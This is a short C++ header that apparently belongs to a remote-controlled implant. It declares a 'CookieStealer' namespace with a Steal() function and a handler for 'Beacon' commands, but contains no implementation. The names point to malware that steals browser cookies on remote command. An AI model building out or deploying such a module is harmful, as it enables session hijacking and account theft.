#pragma once
#include "../beacon.h"

namespace CookieStealer {
    void Steal();
    void OnCommand(const Beacon::Command& cmd);
}